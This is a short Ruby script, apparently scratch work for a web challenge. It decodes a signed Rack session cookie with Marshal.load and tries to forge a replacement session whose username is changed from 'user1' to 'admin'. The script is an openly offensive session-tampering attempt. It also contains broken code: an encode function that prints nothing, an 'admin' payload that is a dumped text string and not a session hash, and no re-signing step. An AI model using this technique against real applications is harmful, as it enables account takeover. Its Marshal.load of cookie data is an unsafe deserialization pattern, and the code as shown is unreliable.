require 'base64'
require 'cgi'
require 'rack'

class Rack::Session::SessionId
end

cookie = 'BAh7CUkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkVmZGIzYTEzNjZiN2U3OGU5MzMxZjFlYTMzZGJhODc2YWRjZDY5OWU3ZTYxYzBlYWYzNzY5MTg0ODkzMGM5NjUxBjsARkkiCWNzcmYGOwBGSSIxZW4yaS9qK2NOOFUxUmxjdE05UWNzTWllYkhQSlBXU2FiUy8xYzZNVU5ZTT0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItYzhiOTcyNDIwNjk5YzA4YmVhZWEwM2Y0MzE2MmRlZjYwMTQxMzIyZAY7AEZJIg11c2VybmFtZQY7AEZJIgp1c2VyMQY7AFQ=--394483f6f286a5532da90e49c708efdd3c8d82e6'

#voo = 'BAhJIgImAXsic2Vzc2lvbl9pZCI9PiM8UmFjazo6U2Vzc2lvbjo6U2Vzc2lv%0AbklkOjB4MDAwMDdmY2JkZjBiNzgzOCBAcHVibGljX2lkPSI4MDBmOTEwZGNi%0AMDM4YjBlNWI3NjRmZTEwMTBiMjdlNzNjZGQyNDQ2YTc2YjM1NjhkNGI5YjY1%0AMTUzMzUzYjkyIj4sICJjc3JmIj0+Ikk4N3FoUFRvdGhDZEI0MzFXZ05aUTkr%0AdTVJaW5nV0VzN3dLdVlLWXNRQVk9IiwgInRyYWNraW5nIj0+eyJIVFRQX1VT%0ARVJfQUdFTlQiPT4iYzhiOTcyNDIwNjk5YzA4YmVhZWEwM2Y0MzE2MmRlZjYw%0AMTQxMzIyZCJ9LCAidXNlcm5hbWUiPT4iYWRtaW4ifQY6BkVU%0A'

def show_session(cookie)
  Marshal.load(Base64.decode64(CGI.unescape(cookie.split("\n").join).split('--').first))
end

class User
end

def encode_object(obj)
    encoded = URI.encode(Base64.encode64(Marshal.dump(obj)))
    print 
end

print show_session(cookie)

newcookie = '{"session_id"=>#<Rack::Session::SessionId:0x00007fcbdf0b7838 @public_id="800f910dcb038b0e5b764fe1010b27e73cdd2446a76b3568d4b9b65153353b92">, "csrf"=>"I87qhPTothCdB431WgNZQ9+u5IingWEs7wKuYKYsQAY=", "tracking"=>{"HTTP_USER_AGENT"=>"c8b972420699c08beaea03f43162def60141322d"}, "username"=>"admin"}'

#print encode_object(newcookie)
#print show_session(voo)